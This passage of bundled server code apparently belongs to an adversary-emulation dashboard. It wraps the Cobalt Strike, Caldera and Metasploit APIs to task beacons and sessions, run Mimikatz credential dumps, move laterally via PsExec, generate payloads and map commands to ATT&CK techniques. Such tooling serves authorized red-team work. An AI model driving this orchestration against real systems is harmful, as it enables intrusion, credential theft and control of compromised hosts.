import {
  processExecutionFeedback,
  recommendFramework
} from "./chunk-5XUOVCTS.js";
import {
  persistOrchestrationPlan,
  updateOrchestrationPlanStatus
} from "./chunk-KAFA4UHS.js";
import {
  getDb,
  init_db
} from "./chunk-CEPCIPS7.js";
import {
  ENV,
  init_env
} from "./chunk-NRYVRXXR.js";
import {
  init_schema,
  metasploitServers
} from "./chunk-TAIMCRAB.js";

// server/lib/c2-abstraction.ts
init_env();
init_db();
init_schema();
import { eq, desc } from "drizzle-orm";

// server/lib/cobalt-strike-adapter.ts
init_env();
var CS_TECHNIQUE_MAP = {
  // Execution
  "shell": { techniqueId: "T1059.003", tactic: "execution", name: "Windows Command Shell" },
  "run": { techniqueId: "T1059.003", tactic: "execution", name: "Execute Command" },
  "execute": { techniqueId: "T1106", tactic: "execution", name: "Native API Execution" },
  "powershell": { techniqueId: "T1059.001", tactic: "execution", name: "PowerShell" },
  "powershell-import": { techniqueId: "T1059.001", tactic: "execution", name: "PowerShell Import" },
  "powerpick": { techniqueId: "T1059.001", tactic: "execution", name: "Unmanaged PowerShell" },
  "psinject": { techniqueId: "T1055.012", tactic: "execution", name: "PowerShell Process Injection" },
  "execute-assembly": { techniqueId: "T1059", tactic: "execution", name: "Execute .NET Assembly" },
  "inline-execute": { techniqueId: "T1106", tactic: "execution", name: "Inline Execute BOF" },
  // Process Injection
  "inject": { techniqueId: "T1055", tactic: "defense-evasion", name: "Process Injection" },
  "shinject": { techniqueId: "T1055.005", tactic: "defense-evasion", name: "Shellcode Injection" },
  "dllinject": { techniqueId: "T1055.001", tactic: "defense-evasion", name: "DLL Injection" },
  "dllload": { techniqueId: "T1574.002", tactic: "persistence", name: "DLL Side-Loading" },
  // Credential Access
  "hashdump": { techniqueId: "T1003.002", tactic: "credential-access", name: "SAM Hash Dump" },
  "logonpasswords": { techniqueId: "T1003.001", tactic: "credential-access", name: "LSASS Memory" },
  "mimikatz": { techniqueId: "T1003.001", tactic: "credential-access", name: "Mimikatz" },
  "dcsync": { techniqueId: "T1003.006", tactic: "credential-access", name: "DCSync" },
  "chromedump": { techniqueId: "T1555.003", tactic: "credential-access", name: "Chrome Credential Dump" },
  "keylogger": { techniqueId: "T1056.001", tactic: "collection", name: "Keylogger" },
  // Lateral Movement
  "psexec": { techniqueId: "T1021.002", tactic: "lateral-movement", name: "PsExec" },
  "psexec_psh": { techniqueId: "T1021.002", tactic: "lateral-movement", name: "PsExec PowerShell" },
  "wmi": { techniqueId: "T1047", tactic: "lateral-movement", name: "WMI" },
  "winrm": { techniqueId: "T1021.006", tactic: "lateral-movement", name: "WinRM" },
  "dcom": { techniqueId: "T1021.003", tactic: "lateral-movement", name: "DCOM" },
  "ssh": { techniqueId: "T1021.004", tactic: "lateral-movement", name: "SSH" },
  "jump": { techniqueId: "T1021", tactic: "lateral-movement", name: "Lateral Movement Jump" },
  "remote-exec": { techniqueId: "T1021", tactic: "lateral-movement", name: "Remote Execution" },
  "link": { techniqueId: "T1021.002", tactic: "lateral-movement", name: "Link to SMB Beacon" },
  "connect": { techniqueId: "T1021", tactic: "lateral-movement", name: "Connect to TCP Beacon" },
  // Privilege Escalation
  "getsystem": { techniqueId: "T1134.001", tactic: "privilege-escalation", name: "Get SYSTEM" },
  "elevate": { techniqueId: "T1548", tactic: "privilege-escalation", name: "Elevate Privileges" },
  "runasadmin": { techniqueId: "T1548.002", tactic: "privilege-escalation", name: "UAC Bypass" },
  "getprivs": { techniqueId: "T1134.002", tactic: "privilege-escalation", name: "Adjust Token Privileges" },
  "make_token": { techniqueId: "T1134.003", tactic: "privilege-escalation", name: "Make Token" },
  "steal_token": { techniqueId: "T1134.001", tactic: "privilege-escalation", name: "Steal Token" },
  "rev2self": { techniqueId: "T1134", tactic: "privilege-escalation", name: "Revert to Self" },
  "runas": { techniqueId: "T1134.002", tactic: "privilege-escalation", name: "Run As" },
  // Discovery
  "ps": { techniqueId: "T1057", tactic: "discovery", name: "Process List" },
  "net": { techniqueId: "T1018", tactic: "discovery", name: "Network Discovery" },
  "portscan": { techniqueId: "T1046", tactic: "discovery", name: "Port Scan" },
  "ipconfig": { techniqueId: "T1016", tactic: "discovery", name: "Network Configuration" },
  "netstat": { techniqueId: "T1049", tactic: "discovery", name: "Network Connections" },
  "whoami": { techniqueId: "T1033", tactic: "discovery", name: "System Owner/User" },
  "drives": { techniqueId: "T1083", tactic: "discovery", name: "Enumerate Drives" },
  "ls": { techniqueId: "T1083", tactic: "discovery", name: "File/Directory Discovery" },
  "reg": { techniqueId: "T1012", tactic: "discovery", name: "Registry Query" },
  // Persistence
  "argue": { techniqueId: "T1036.004", tactic: "defense-evasion", name: "Argument Spoofing" },
  "service": { techniqueId: "T1543.003", tactic: "persistence", name: "Windows Service" },
  "schtasks": { techniqueId: "T1053.005", tactic: "persistence", name: "Scheduled Task" },
  // Defense Evasion
  "ppid": { techniqueId: "T1134.004", tactic: "defense-evasion", name: "Parent PID Spoofing" },
  "blockdlls": { techniqueId: "T1562.001", tactic: "defense-evasion", name: "Block DLLs" },
  "spawnto": { techniqueId: "T1055", tactic: "defense-evasion", name: "Set Spawn To" },
  "timestomp": { techniqueId: "T1070.006", tactic: "defense-evasion", name: "Timestomp" },
  // Collection
  "screenshot": { techniqueId: "T1113", tactic: "collection", name: "Screen Capture" },
  "clipboard": { techniqueId: "T1115", tactic: "collection", name: "Clipboard Data" },
  "desktop": { techniqueId: "T1113", tactic: "collection", name: "Desktop VNC" },
  // Exfiltration / File Transfer
  "upload": { techniqueId: "T1105", tactic: "command-and-control", name: "Upload File" },
  "download": { techniqueId: "T1041", tactic: "exfiltration", name: "Download File" },
  // C2 / Pivoting
  "socks": { techniqueId: "T1090.001", tactic: "command-and-control", name: "SOCKS Proxy" },
  "rportfwd": { techniqueId: "T1090", tactic: "command-and-control", name: "Reverse Port Forward" },
  "covertvpn": { techniqueId: "T1572", tactic: "command-and-control", name: "Covert VPN" },
  "sleep": { techniqueId: "T1029", tactic: "command-and-control", name: "Sleep/Jitter Control" },
  "exit": { techniqueId: "T1070.004", tactic: "defense-evasion", name: "Exit Beacon" },
  // Kerberos
  "kerberos_ticket_use": { techniqueId: "T1550.003", tactic: "lateral-movement", name: "Pass the Ticket" },
  "kerberos_ticket_purge": { techniqueId: "T1550.003", tactic: "credential-access", name: "Purge Kerberos Tickets" },
  "golden_ticket": { techniqueId: "T1558.001", tactic: "credential-access", name: "Golden Ticket" }
};
var CobaltStrikeAdapter = class {
  constructor() {
    this.framework = "cobaltstrike";
  }
  get baseUrl() {
    return ENV.CS_TEAM_SERVER_URL || "";
  }
  get apiKey() {
    return ENV.CS_API_KEY || "";
  }
  get apiPort() {
    return ENV.CS_API_PORT || 55553;
  }
  /**
   * Make an authenticated request to the Cobalt Strike Team Server REST API.
   * The CS REST API (via the Aggressor Script bridge or third-party REST wrappers
   * like cs-rest-api) typically uses Bearer token or custom header auth.
   */
  async csFetch(endpoint, options = {}) {
    if (!this.baseUrl) throw new Error("CS_TEAM_SERVER_URL not configured");
    const url = `${this.baseUrl}:${this.apiPort}${endpoint}`;
    const resp = await fetch(url, {
      ...options,
      headers: {
        "Authorization": `Bearer ${this.apiKey}`,
        "Content-Type": "application/json",
        "X-CS-Operator": ENV.CS_USERNAME || "caldera-dashboard",
        ...options.headers || {}
      }
    });
    if (!resp.ok) {
      const text = await resp.text().catch(() => "");
      throw new Error(`CS API ${resp.status}: ${text}`);
    }
    return resp.json().catch(() => null);
  }
  // ─── IC2Adapter Implementation ────────────────────────────────────────
  async healthCheck() {
    try {
      const [info, beacons, listeners] = await Promise.all([
        this.csFetch("/api/server/info").catch(() => null),
        this.csFetch("/api/beacons").catch(() => []),
        this.csFetch("/api/listeners").catch(() => [])
      ]);
      const beaconCount = Array.isArray(beacons) ? beacons.length : 0;
      const listenerCount = Array.isArray(listeners) ? listeners.length : 0;
      return {
        framework: "cobaltstrike",
        connected: true,
        version: info?.version || info?.cs_version || "4.x",
        agentCount: beaconCount,
        activeJobs: 0,
        lastChecked: (/* @__PURE__ */ new Date()).toISOString(),
        details: {
          beacons: beaconCount,
          listeners: listenerCount,
          license: info?.license || "unknown",
          profile: info?.profile || "default"
        }
      };
    } catch (err) {
      return {
        framework: "cobaltstrike",
        connected: false,
        agentCount: 0,
        activeJobs: 0,
        lastChecked: (/* @__PURE__ */ new Date()).toISOString(),
        error: err.message
      };
    }
  }
  async listAgents() {
    try {
      const beacons = await this.csFetch("/api/beacons");
      if (!Array.isArray(beacons)) return [];
      return beacons.map((b) => this.mapBeaconToAgent(b));
    } catch {
      return [];
    }
  }
  async getAgent(agentId) {
    try {
      const beacon = await this.csFetch(`/api/beacons/${agentId}`);
      if (beacon) return this.mapBeaconToAgent(beacon);
    } catch {
    }
    const agents = await this.listAgents();
    return agents.find((a) => a.id === agentId) || null;
  }
  async searchModules(query) {
    const csCommands = this.getBuiltinCommands();
    const q = query.toLowerCase();
    return csCommands.filter(
      (c) => c.name.toLowerCase().includes(q) || c.description.toLowerCase().includes(q) || c.id.includes(q) || c.techniqueId?.toLowerCase().includes(q) || c.tactic?.toLowerCase().includes(q)
    );
  }
  async getModule(moduleId) {
    const modules = this.getBuiltinCommands();
    return modules.find((m) => m.id === moduleId) || null;
  }
  async dispatch(request) {
    const startedAt = (/* @__PURE__ */ new Date()).toISOString();
    try {
      const result = await this.csFetch(`/api/beacons/${request.agentId}/task`, {
        method: "POST",
        body: JSON.stringify({
          command: request.moduleId,
          args: request.options?.args || "",
          data: request.options?.data,
          operator: ENV.CS_USERNAME || "caldera-dashboard"
        })
      });
      const taskId = result?.taskId || result?.task_id || `cs-${request.agentId}-${Date.now()}`;
      return {
        taskId,
        framework: "cobaltstrike",
        agentId: request.agentId,
        moduleId: request.moduleId,
        status: "pending",
        // Beacons are asynchronous — task queued until next checkin
        exitCode: -1,
        stdout: "",
        stderr: "",
        startedAt,
        metadata: {
          beaconId: request.agentId,
          command: request.moduleId,
          queuedAt: startedAt
        }
      };
    } catch (err) {
      return {
        taskId: `cs-err-${Date.now()}`,
        framework: "cobaltstrike",
        agentId: request.agentId,
        moduleId: request.moduleId,
        status: "error",
        exitCode: -1,
        stdout: "",
        stderr: err.message,
        startedAt,
        completedAt: (/* @__PURE__ */ new Date()).toISOString()
      };
    }
  }
  async pollResult(taskId, agentId) {
    try {
      const result = await this.csFetch(`/api/beacons/${agentId}/tasks/${taskId}`);
      const isComplete = result?.status === "complete" || result?.completed;
      return {
        taskId,
        framework: "cobaltstrike",
        agentId,
        moduleId: result?.command || "",
        status: isComplete ? "success" : result?.status === "error" ? "failed" : "pending",
        exitCode: isComplete ? 0 : -1,
        stdout: result?.output || result?.result || "",
        stderr: result?.error || "",
        startedAt: result?.timestamp ? new Date(result.timestamp).toISOString() : (/* @__PURE__ */ new Date()).toISOString(),
        completedAt: isComplete ? (/* @__PURE__ */ new Date()).toISOString() : void 0,
        metadata: {
          operator: result?.operator,
          beaconId: agentId
        }
      };
    } catch (err) {
      return {
        taskId,
        framework: "cobaltstrike",
        agentId,
        moduleId: "",
        status: "error",
        exitCode: -1,
        stdout: "",
        stderr: err.message,
        startedAt: (/* @__PURE__ */ new Date()).toISOString()
      };
    }
  }
  async killAgent(agentId) {
    try {
      await this.csFetch(`/api/beacons/${agentId}/task`, {
        method: "POST",
        body: JSON.stringify({ command: "exit", args: "" })
      });
      return true;
    } catch {
      return false;
    }
  }
  // ─── Cobalt Strike-Specific Methods ───────────────────────────────────
  /** List all active listeners on the Team Server */
  async listListeners() {
    try {
      const listeners = await this.csFetch("/api/listeners");
      return Array.isArray(listeners) ? listeners : [];
    } catch {
      return [];
    }
  }
  /** Create a new listener */
  async createListener(params) {
    return this.csFetch("/api/listeners", {
      method: "POST",
      body: JSON.stringify(params)
    });
  }
  /** Stop a listener */
  async stopListener(name) {
    try {
      await this.csFetch(`/api/listeners/${encodeURIComponent(name)}`, {
        method: "DELETE"
      });
      return true;
    } catch {
      return false;
    }
  }
  /** Adjust beacon sleep time and jitter */
  async setSleep(beaconId, sleepMs, jitter) {
    try {
      await this.csFetch(`/api/beacons/${beaconId}/task`, {
        method: "POST",
        body: JSON.stringify({
          command: "sleep",
          args: `${Math.floor(sleepMs / 1e3)} ${jitter}`
        })
      });
      return true;
    } catch {
      return false;
    }
  }
  /** Generate a payload for a given listener */
  async generatePayload(config) {
    try {
      const result = await this.csFetch("/api/payloads/generate", {
        method: "POST",
        body: JSON.stringify(config)
      });
      return result;
    } catch {
      return null;
    }
  }
  /** Get beacon output/console history */
  async getBeaconOutput(beaconId) {
    try {
      const result = await this.csFetch(`/api/beacons/${beaconId}/output`);
      return Array.isArray(result) ? result : [];
    } catch {
      return [];
    }
  }
  /** Add a note to a beacon */
  async setBeaconNote(beaconId, note) {
    try {
      await this.csFetch(`/api/beacons/${beaconId}/note`, {
        method: "PUT",
        body: JSON.stringify({ note })
      });
      return true;
    } catch {
      return false;
    }
  }
  /** Get the current Malleable C2 profile */
  async getMalleableProfile() {
    try {
      return await this.csFetch("/api/server/profile");
    } catch {
      return null;
    }
  }
  /** Get download cradles for a listener */
  async getDownloadCradles(listener) {
    try {
      const result = await this.csFetch(`/api/listeners/${encodeURIComponent(listener)}/cradles`);
      return result || {};
    } catch {
      return {};
    }
  }
  /** Execute a Beacon Object File (BOF) on a beacon */
  async executeBOF(beaconId, bofPath, args) {
    return this.dispatch({
      agentId: beaconId,
      moduleId: "inline-execute",
      options: {
        args: `${bofPath} ${args || ""}`.trim()
      }
    });
  }
  /** Run Mimikatz on a beacon */
  async runMimikatz(beaconId, command = "sekurlsa::logonpasswords") {
    return this.dispatch({
      agentId: beaconId,
      moduleId: "mimikatz",
      options: { args: command }
    });
  }
  /** Perform lateral movement via PsExec */
  async lateralPsExec(beaconId, target, listener, service) {
    return this.dispatch({
      agentId: beaconId,
      moduleId: "psexec",
      options: {
        args: `${target} ${listener}${service ? ` ${service}` : ""}`
      }
    });
  }
  /** Spawn a new beacon in a different process */
  async spawnBeacon(beaconId, listener, arch) {
    return this.dispatch({
      agentId: beaconId,
      moduleId: "spawn",
      options: {
        args: `${arch || "x64"} ${listener}`
      }
    });
  }
  // ─── Private Helpers ──────────────────────────────────────────────────
  mapBeaconToAgent(b) {
    return {
      id: String(b.bid || b.id || b.beacon_id),
      framework: "cobaltstrike",
      hostname: b.computer || b.hostname || "unknown",
      username: b.user || b.username || "unknown",
      platform: this.extractPlatform(b),
      architecture: b.arch || b.barch || (b.is64 ? "x64" : "x86"),
      ipAddress: b.internal || b.host || b.external || "",
      status: this.beaconStatus(b),
      lastSeen: b.last ? new Date(b.last).toISOString() : (/* @__PURE__ */ new Date()).toISOString(),
      privileges: this.extractPrivileges(b),
      processId: b.pid,
      processName: b.process || b.proc,
      transport: this.extractTransport(b),
      metadata: {
        beaconId: b.bid,
        externalIp: b.external,
        listener: b.listener,
        parentBeacon: b.pbid,
        sleep: b.sleep,
        jitter: b.jitter,
        note: b.note,
        is64: b.is64,
        charset: b.charset,
        os: b.os || b.ver
      }
    };
  }
  beaconStatus(b) {
    if (b.alive === false) return "dead";
    if (!b.last) return "unknown";
    const lastCheckin = typeof b.last === "number" ? b.last : new Date(b.last).getTime();
    const sleepMs = b.sleep || 6e4;
    const missedCheckins = (Date.now() - lastCheckin) / sleepMs;
    if (missedCheckins < 3) return "active";
    if (missedCheckins < 10) return "dormant";
    return "dead";
  }
  extractPlatform(b) {
    const os = (b.os || b.ver || "").toLowerCase();
    if (os.includes("windows")) return "windows";
    if (os.includes("linux")) return "linux";
    if (os.includes("darwin") || os.includes("macos") || os.includes("mac os")) return "macos";
    return "windows";
  }
  extractPrivileges(b) {
    const user = (b.user || "").toLowerCase();
    if (user.includes("system") || user.includes("root")) return "system";
    if ((b.user || "").startsWith("*")) return "admin";
    return "user";
  }
  extractTransport(b) {
    const listener = (b.listener || "").toLowerCase();
    if (listener.includes("dns")) return "dns";
    if (listener.includes("smb")) return "smb";
    if (listener.includes("tcp")) return "tcp";
    if (listener.includes("https")) return "https";
    if (listener.includes("http")) return "http";
    return "https";
  }
  /**
   * Returns all built-in Cobalt Strike commands as C2Module objects
   * with full MITRE ATT&CK technique mappings.
   */
  getBuiltinCommands() {
    const modules = [];
    for (const [cmdId, mapping] of Object.entries(CS_TECHNIQUE_MAP)) {
      modules.push({
        id: cmdId,
        framework: "cobaltstrike",
        name: mapping.name,
        description: `Cobalt Strike: ${mapping.name}`,
        type: "command",
        platform: this.commandPlatforms(cmdId),
        techniqueId: mapping.techniqueId,
        tactic: mapping.tactic,
        rank: this.commandRank(cmdId)
      });
    }
    modules.push(
      {
        id: "bof-sa-whoami",
        framework: "cobaltstrike",
        name: "BOF: Situational Awareness - Whoami",
        description: "BOF implementation of whoami with extended info",
        type: "bof",
        platform: ["windows"],
        techniqueId: "T1033",
        tactic: "discovery",
        rank: 500
      },
      {
        id: "bof-sa-netview",
        framework: "cobaltstrike",
        name: "BOF: Network View",
        description: "BOF for enumerating network shares and sessions",
        type: "bof",
        platform: ["windows"],
        techniqueId: "T1135",
        tactic: "discovery",
        rank: 500
      },
      {
        id: "bof-sa-ldapsearch",
        framework: "cobaltstrike",
        name: "BOF: LDAP Search",
        description: "BOF for LDAP queries against Active Directory",
        type: "bof",
        platform: ["windows"],
        techniqueId: "T1087.002",
        tactic: "discovery",
        rank: 500
      },
      {
        id: "bof-nanodump",
        framework: "cobaltstrike",
        name: "BOF: Nanodump",
        description: "BOF for dumping LSASS using syscalls",
        type: "bof",
        platform: ["windows"],
        techniqueId: "T1003.001",
        tactic: "credential-access",
        rank: 600
      },
      {
        id: "bof-inlinewhispers",
        framework: "cobaltstrike",
        name: "BOF: InlineWhispers",
        description: "Direct syscall BOF for evasion",
        type: "bof",
        platform: ["windows"],
        techniqueId: "T1106",
        tactic: "defense-evasion",
        rank: 600
      }
    );
    return modules;
  }
  commandPlatforms(cmdId) {
    const crossPlatform = ["shell", "run", "upload", "download", "sleep", "exit", "ls", "ps", "screenshot"];
    if (crossPlatform.includes(cmdId)) return ["windows", "linux", "macos"];
    return ["windows"];
  }
  commandRank(cmdId) {
    const highReliability = ["shell", "run", "upload", "download", "ps", "ls", "whoami", "ipconfig", "sleep"];
    const medReliability = ["powershell", "execute-assembly", "hashdump", "screenshot", "psexec", "net"];
    if (highReliability.includes(cmdId)) return 500;
    if (medReliability.includes(cmdId)) return 400;
    return 300;
  }
};

// server/lib/c2-abstraction.ts
var CALDERA_BASE = ENV.calderaBaseUrl || "";
var CALDERA_KEY = ENV.calderaApiKey || "";
async function calderaFetch(endpoint, options = {}) {
  if (!CALDERA_BASE) throw new Error("CALDERA_BASE_URL not configured");
  const url = `${CALDERA_BASE}/api/v2${endpoint}`;
  const resp = await fetch(url, {
    ...options,
    headers: {
      "KEY": CALDERA_KEY,
      "Content-Type": "application/json",
      ...options.headers || {}
    }
  });
  if (!resp.ok) throw new Error(`Caldera API ${resp.status}: ${await resp.text()}`);
  return resp.json();
}
var CalderaAdapter = class {
  constructor() {
    this.framework = "caldera";
  }
  async healthCheck() {
    try {
      const [health, agents] = await Promise.all([
        calderaFetch("/health").catch(() => null),
        calderaFetch("/agents").catch(() => [])
      ]);
      return {
        framework: "caldera",
        connected: true,
        version: health?.version || "unknown",
        agentCount: Array.isArray(agents) ? agents.length : 0,
        activeJobs: 0,
        lastChecked: (/* @__PURE__ */ new Date()).toISOString()
      };
    } catch (err) {
      return {
        framework: "caldera",
        connected: false,
        agentCount: 0,
        activeJobs: 0,
        lastChecked: (/* @__PURE__ */ new Date()).toISOString(),
        error: err.message
      };
    }
  }
  async listAgents() {
    try {
      const agents = await calderaFetch("/agents");
      if (!Array.isArray(agents)) return [];
      return agents.map((a) => ({
        id: a.paw,
        framework: "caldera",
        hostname: a.host || "unknown",
        username: a.username || "unknown",
        platform: a.platform || "unknown",
        architecture: a.architecture || "unknown",
        ipAddress: a.host_ip_addrs?.[0] || a.host || "",
        status: this.mapAgentStatus(a),
        lastSeen: a.last_seen || (/* @__PURE__ */ new Date()).toISOString(),
        privileges: a.privilege || "user",
        processId: a.pid,
        processName: a.exe_name,
        transport: a.contact || "http",
        metadata: { group: a.group, trusted: a.trusted, executors: a.executors }
      }));
    } catch {
      return [];
    }
  }
  mapAgentStatus(a) {
    if (!a.last_seen) return "unknown";
    const lastSeen = new Date(a.last_seen).getTime();
    const now = Date.now();
    const diffMin = (now - lastSeen) / 6e4;
    if (diffMin < 5) return "active";
    if (diffMin < 60) return "dormant";
    return "dead";
  }
  async getAgent(agentId) {
    const agents = await this.listAgents();
    return agents.find((a) => a.id === agentId) || null;
  }
  async searchModules(query) {
    try {
      const abilities = await calderaFetch("/abilities");
      if (!Array.isArray(abilities)) return [];
      const q = query.toLowerCase();
      return abilities.filter(
        (a) => a.name?.toLowerCase().includes(q) || a.technique_id?.toLowerCase().includes(q) || a.description?.toLowerCase().includes(q) || a.tactic?.toLowerCase().includes(q)
      ).slice(0, 50).map((a) => ({
        id: a.ability_id,
        framework: "caldera",
        name: a.name,
        description: a.description || "",
        type: "ability",
        platform: a.executors?.map((e) => e.platform) || [],
        techniqueId: a.technique_id,
        tactic: a.tactic,
        rank: 300
      }));
    } catch {
      return [];
    }
  }
  async getModule(moduleId) {
    try {
      const abilities = await calderaFetch("/abilities");
      const ability = abilities?.find((a) => a.ability_id === moduleId);
      if (!ability) return null;
      return {
        id: ability.ability_id,
        framework: "caldera",
        name: ability.name,
        description: ability.description || "",
        type: "ability",
        platform: ability.executors?.map((e) => e.platform) || [],
        techniqueId: ability.technique_id,
        tactic: ability.tactic,
        rank: 300
      };
    } catch {
      return null;
    }
  }
  async dispatch(request) {
    const startedAt = (/* @__PURE__ */ new Date()).toISOString();
    try {
      const op = await calderaFetch("/operations", {
        method: "POST",
        body: JSON.stringify({
          name: `c2-dispatch-${Date.now()}`,
          adversary: { adversary_id: "", name: "", description: "" },
          source: { id: "" },
          auto_close: true,
          jitter: "0/0"
        })
      });
      await calderaFetch(`/operations/${op.id}/potential-links`, {
        method: "POST",
        body: JSON.stringify({
          paw: request.agentId,
          ability_id: request.moduleId,
          facts: Object.entries(request.options || {}).map(([k, v]) => ({
            trait: k,
            value: v
          }))
        })
      });
      const taskId = `caldera-${op.id}-${request.moduleId}`;
      return {
        taskId,
        framework: "caldera",
        agentId: request.agentId,
        moduleId: request.moduleId,
        status: "running",
        exitCode: -1,
        stdout: "",
        stderr: "",
        startedAt,
        metadata: { operationId: op.id }
      };
    } catch (err) {
      return {
        taskId: `caldera-err-${Date.now()}`,
        framework: "caldera",
        agentId: request.agentId,
        moduleId: request.moduleId,
        status: "error",
        exitCode: -1,
        stdout: "",
        stderr: err.message,
        startedAt,
        completedAt: (/* @__PURE__ */ new Date()).toISOString()
      };
    }
  }
  async pollResult(taskId, agentId) {
    const parts = taskId.split("-");
    const operationId = parts[1];
    try {
      const links = await calderaFetch(`/operations/${operationId}/links`);
      const link = links?.find((l) => l.paw === agentId);
      if (!link) {
        return {
          taskId,
          framework: "caldera",
          agentId,
          moduleId: "",
          status: "pending",
          exitCode: -1,
          stdout: "",
          stderr: "",
          startedAt: (/* @__PURE__ */ new Date()).toISOString()
        };
      }
      const finished = link.finish !== null && link.finish !== void 0 && link.finish !== "";
      return {
        taskId,
        framework: "caldera",
        agentId,
        moduleId: link.ability?.ability_id || "",
        status: finished ? link.status === 0 ? "success" : "failed" : "running",
        exitCode: link.status ?? -1,
        stdout: link.output ? Buffer.from(link.output, "base64").toString("utf-8") : "",
        stderr: "",
        startedAt: link.decide || (/* @__PURE__ */ new Date()).toISOString(),
        completedAt: link.finish || void 0
      };
    } catch (err) {
      return {
        taskId,
        framework: "caldera",
        agentId,
        moduleId: "",
        status: "error",
        exitCode: -1,
        stdout: "",
        stderr: err.message,
        startedAt: (/* @__PURE__ */ new Date()).toISOString()
      };
    }
  }
  async killAgent(agentId) {
    try {
      await calderaFetch(`/agents/${agentId}`, { method: "DELETE" });
      return true;
    } catch {
      return false;
    }
  }
};
var MetasploitAdapter = class {
  constructor() {
    this.framework = "metasploit";
    this.clientPromise = null;
  }
  async getClient() {
    if (!this.clientPromise) {
      this.clientPromise = (async () => {
        const { MsfClient } = await import("./msf-client-X5VGFPRX.js");
        const db = await getDb();
        if (db) {
          const servers = await db.select().from(metasploitServers).where(eq(metasploitServers.msfStatus, "online")).orderBy(desc(metasploitServers.msfCreatedAt)).limit(1);
          if (servers.length > 0) {
            const s = servers[0];
            const client = s.sshTunnelEnabled ? await MsfClient.fromServerWithTunnel({
              ipAddress: s.ipAddress || "",
              rpcPort: s.rpcPort || 55553,
              rpcUser: s.rpcUser || "msf",
              rpcPass: s.rpcPass || "",
              rpcSsl: s.rpcSsl || false,
              sshUser: s.sshUser || "root",
              sshKeyPath: s.sshKeyPath || void 0
            }) : new MsfClient({
              host: s.ipAddress || "127.0.0.1",
              port: s.rpcPort || 55553,
              user: s.rpcUser || "msf",
              pass: s.rpcPass || "",
              ssl: s.rpcSsl || false
            });
            if (client) {
              await client.login();
              return client;
            }
          }
        }
        if (ENV.MSF_RPC_HOST) {
          const { MsfClient: MC } = await import("./msf-client-X5VGFPRX.js");
          const client = new MC({
            host: ENV.MSF_RPC_HOST,
            port: ENV.MSF_RPC_PORT,
            user: ENV.MSF_RPC_USER,
            pass: ENV.MSF_RPC_PASS,
            ssl: ENV.MSF_RPC_SSL
          });
          await client.login();
          return client;
        }
        return null;
      })();
    }
    return this.clientPromise;
  }
  async healthCheck() {
    try {
      const client = await this.getClient();
      if (!client) {
        return {
          framework: "metasploit",
          connected: false,
          agentCount: 0,
          activeJobs: 0,
          lastChecked: (/* @__PURE__ */ new Date()).toISOString(),
          error: "No Metasploit server configured"
        };
      }
      const health = await client.healthCheck();
      return {
        framework: "metasploit",
        connected: health.connected,
        version: health.version,
        agentCount: health.sessions,
        activeJobs: health.jobs,
        lastChecked: (/* @__PURE__ */ new Date()).toISOString(),
        details: { modules: health.modules }
      };
    } catch (err) {
      this.clientPromise = null;
      return {
        framework: "metasploit",
        connected: false,
        agentCount: 0,
        activeJobs: 0,
        lastChecked: (/* @__PURE__ */ new Date()).toISOString(),
        error: err.message
      };
    }
  }
  async listAgents() {
    try {
      const client = await this.getClient();
      if (!client) return [];
      const sessions = await client.listSessions();
      return Object.entries(sessions).map(([id, s]) => ({
        id,
        framework: "metasploit",
        hostname: s.info || "unknown",
        username: s.username || "unknown",
        platform: s.platform || "unknown",
        architecture: s.arch || "unknown",
        ipAddress: s.target_host || s.tunnel_peer?.split(":")[0] || "",
        status: "active",
        lastSeen: (/* @__PURE__ */ new Date()).toISOString(),
        privileges: s.username?.includes("SYSTEM") || s.username === "root" ? "system" : "user",
        transport: s.type || "shell",
        metadata: {
          sessionType: s.type,
          viaExploit: s.via_exploit,
          viaPayload: s.via_payload,
          tunnelLocal: s.tunnel_local,
          tunnelPeer: s.tunnel_peer,
          routes: s.routes
        }
      }));
    } catch {
      return [];
    }
  }
  async getAgent(agentId) {
    const agents = await this.listAgents();
    return agents.find((a) => a.id === agentId) || null;
  }
  async searchModules(query) {
    try {
      const client = await this.getClient();
      if (!client) return [];
      const modules = await client.searchModules(query);
      return modules.slice(0, 50).map((m) => ({
        id: m.fullname,
        framework: "metasploit",
        name: m.name,
        description: m.description || "",
        type: m.type || "exploit",
        platform: [m.platform || "multi"],
        rank: this.mapRank(m.rank),
        options: {}
      }));
    } catch {
      return [];
    }
  }
  mapRank(rank) {
    const rankMap = {
      manual: 0,
      low: 100,
      average: 200,
      normal: 300,
      good: 400,
      great: 500,
      excellent: 600
    };
    if (typeof rank === "string") return rankMap[rank] || 300;
    return typeof rank === "number" ? rank : 300;
  }
  async getModule(moduleId) {
    try {
      const client = await this.getClient();
      if (!client) return null;
      const parts = moduleId.split("/");
      const moduleType = parts[0];
      const info = await client.getModuleInfo(moduleType, moduleId);
      const options = await client.getModuleOptions(moduleType, moduleId);
      return {
        id: moduleId,
        framework: "metasploit",
        name: info.name,
        description: info.description || "",
        type: moduleType,
        platform: info.targets?.map((t) => t.name) || ["multi"],
        rank: info.rank,
        options: Object.fromEntries(
          Object.entries(options || {}).map(([k, v]) => [k, {
            name: k,
            type: v.type,
            required: v.required,
            default: v.default,
            description: v.desc,
            values: v.enums
          }])
        )
      };
    } catch {
      return null;
    }
  }
  async dispatch(request) {
    const startedAt = (/* @__PURE__ */ new Date()).toISOString();
    try {
      const client = await this.getClient();
      if (!client) throw new Error("No Metasploit connection");
      const sessionId = request.agentId;
      const session = (await client.listSessions())[sessionId];
      if (!session) throw new Error(`Session ${sessionId} not found`);
      if (session.type === "meterpreter") {
        const command = request.options?.command || request.moduleId;
        await client.meterpreterWrite(sessionId, command);
        await new Promise((r) => setTimeout(r, 2e3));
        const output = await client.meterpreterRead(sessionId);
        return {
          taskId: `msf-${sessionId}-${Date.now()}`,
          framework: "metasploit",
          agentId: sessionId,
          moduleId: request.moduleId,
          status: "success",
          exitCode: 0,
          stdout: output,
          stderr: "",
          startedAt,
          completedAt: (/* @__PURE__ */ new Date()).toISOString()
        };
      } else {
        const command = request.options?.command || request.moduleId;
        await client.shellWrite(sessionId, command + "\n");
        await new Promise((r) => setTimeout(r, 2e3));
        const result = await client.shellRead(sessionId);
        return {
          taskId: `msf-${sessionId}-${Date.now()}`,
          framework: "metasploit",
          agentId: sessionId,
          moduleId: request.moduleId,
          status: "success",
          exitCode: 0,
          stdout: result.data,
          stderr: "",
          startedAt,
          completedAt: (/* @__PURE__ */ new Date()).toISOString()
        };
      }
    } catch (err) {
      return {
        taskId: `msf-err-${Date.now()}`,
        framework: "metasploit",
        agentId: request.agentId,
        moduleId: request.moduleId,
        status: "error",
        exitCode: -1,
        stdout: "",
        stderr: err.message,
